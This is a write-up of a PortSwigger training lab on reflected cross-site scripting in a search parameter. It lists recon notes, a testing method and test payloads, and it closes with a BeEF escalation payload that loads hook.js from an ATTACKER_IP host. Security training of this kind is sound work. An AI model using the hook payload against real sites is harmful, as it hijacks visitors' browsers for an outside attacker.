# Lab: Reflected XSS
[Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

## Category
Cross-Site Scripting (Reflected)

## Lab Objective
Execute arbitrary JavaScript in the victim’s browser via reflected input.

---

## Vulnerable Functionality
Search functionality reflects user input directly in the response.

---

## Recon & Initial Observations
 - Search parameter is user-controlled
 - Input is reflected without proper encoding
 - No input sanitization detected

---

## Attack Surface
 - Parameter: search
 - Location: URL query
 - Type: String
 - Notes: Reflected in HTML without encoding

---

## Testing Methodology
1. Identify all input points in the page (e.g., search, comments, URL parameters)
2. Inject simple HTML tags to confirm reflection and rendering
3. Intercept requests using Burp Suite to observe request/response behavior
4. Test execution of JavaScript payloads and monitor browser console
5. Refine payloads based on server response and context (HTML, JavaScript, attribute)
6. Document all successful and failed attempts for reproducibility

---

## Exploitation Walkthrough
1. Submit crafted input in search field
2. Payload is reflected in response
3. JavaScript executed in browser context

---

## Payload Used
- YOUWE<' *(used to confirm reflection and HTML context)*
- `<img src=s >`
- `<script>alert(1)</script>`

## Post-Exploitation (Conceptual): BeEF Framework
Although the lab focuses on basic JavaScript execution, this reflected XSS vulnerability **can be escalated** to advanced client-side exploitation using tools such as the **BeEF (Browser Exploitation Framework)**.

### Example Escalation Payload
`<script src="http://ATTACKER_IP:3000/hook.js"></script>`
